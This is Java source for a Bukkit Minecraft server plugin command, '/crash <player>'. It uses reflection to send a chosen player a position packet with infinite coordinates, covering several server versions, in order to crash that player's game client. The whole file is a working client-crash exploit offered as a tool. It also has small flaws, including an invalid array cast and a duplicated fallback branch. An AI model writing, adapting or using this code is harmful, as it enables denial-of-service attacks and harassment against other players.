package me.pp021.crashplayer;

import java.lang.reflect.Method;
import java.util.Set;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import com.google.common.collect.Sets;

public class Crash implements CommandExecutor {

	@Override
	public boolean onCommand(CommandSender sender, Command command, String lable, String[] args) {
		if (!sender.hasPermission("crash.yes")) {
			sender.sendMessage(ChatColor.RED + "No permission.");
			return true;
		}
		if (args.length == 0) {
			sender.sendMessage(ChatColor.RED + "/crash <player>");
			return true;
		}
		Player target = Bukkit.getPlayer(args[0]);
		if (target == null) {
			sender.sendMessage(ChatColor.RED + "there is no player name " + args[0]);
			return true;
		}
		//PacketPlayOutPosition packet = new PacketPlayOutPosition(Double.POSITIVE_INFINITY, 0, Double.POSITIVE_INFINITY, 90F, 0F, Sets.newHashSet(Arrays.asList(EnumPlayerTeleportFlags.X, EnumPlayerTeleportFlags.Y, EnumPlayerTeleportFlags.X_ROT, EnumPlayerTeleportFlags.Y_ROT, EnumPlayerTeleportFlags.Z)));
		//((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
		Object packet = getCrashPacket();
		if (packet == null) {
			sender.sendMessage(ChatColor.RED + "look like u server not support");
			return true;
		}
		sendPacket(target, packet);
		sender.sendMessage(ChatColor.GRAY + "sent crash packet");
		return true;
	}


	
	
	
	
	
	private void sendPacket(Player player, Object packet) {
		try {
			Object handle = player.getClass().getMethod("getHandle").invoke(player);
			Object playerConnection = handle.getClass().getField("playerConnection").get(handle);
			playerConnection.getClass().getMethod("sendPacket", getNMSClass("Packet")).invoke(playerConnection, packet);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private Class<?> getNMSClass(String name) {
		try {
			return Class.forName("net.minecraft.server."
					+ Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3] + "." + name);
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
		}
		return null;
	}

	private Object getCrashPacket() {
		Class<?> PacketPlayOutPosition = getNMSClass("PacketPlayOutPosition");
		Class<?> PacketPlayOutPositionEnum = getNMSClass("PacketPlayOutPosition$EnumPlayerTeleportFlags");
		Object[] a = getValues(PacketPlayOutPositionEnum);
		if (a == null) a = (Object[]) new Object();
		Object packet = null;
		try {
			// 1.8.8 R3
			packet = PacketPlayOutPosition.getConstructor(
					new Class<?>[] { double.class, double.class, double.class, float.class, float.class, Set.class })
					.newInstance(Double.POSITIVE_INFINITY, 0, Double.POSITIVE_INFINITY, 90F, 0F, Sets.newHashSet(a));
		} catch (Throwable e) {
			// 1.9.4 (R4?) & 1.10.2 R1 & 1.11.2 R1 & 1.12.2 R1 & 1.13.2 R2
			try {
				packet = PacketPlayOutPosition.getConstructor(
						new Class<?>[] { double.class, double.class, double.class, float.class, float.class, Set.class, int.class })
						.newInstance(Double.POSITIVE_INFINITY, 0, Double.POSITIVE_INFINITY, 90F, 0F, Sets.newHashSet(a), 0);
			} catch (Throwable e1) {
				// 1.7 R4
				try {
					packet = PacketPlayOutPosition.getConstructor(
							new Class<?>[] { double.class, double.class, double.class, float.class, float.class, boolean.class })
							.newInstance(Double.POSITIVE_INFINITY, 0, Double.POSITIVE_INFINITY, 90F, 0F, true);
				} catch (Throwable e2) {
					try {
						packet = PacketPlayOutPosition.getConstructor(
								new Class<?>[] { double.class, double.class, double.class, float.class, float.class, boolean.class })
								.newInstance(Double.POSITIVE_INFINITY, 0, Double.POSITIVE_INFINITY, 90F, 0F, true);
					} catch (Throwable e3) {
						packet = null;
					}
				}
			}
		}
		return packet;
	}

	// https://www.logicbig.com/how-to/code-snippets/jcode-reflection-values-field-in-enum.html
	@SuppressWarnings("unchecked")
	private <E> E[] getValues(Class<?> enumClass) {
		Object o = null;
		try {
			// Field f = enumClass.getDeclaredField("$VALUES");
			// f.setAccessible(true);
			// o = f.get(null);
			Method m = enumClass.getDeclaredMethod("values");
			m.setAccessible(true);
			o = m.invoke(null);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return (E[]) o;
	}

}
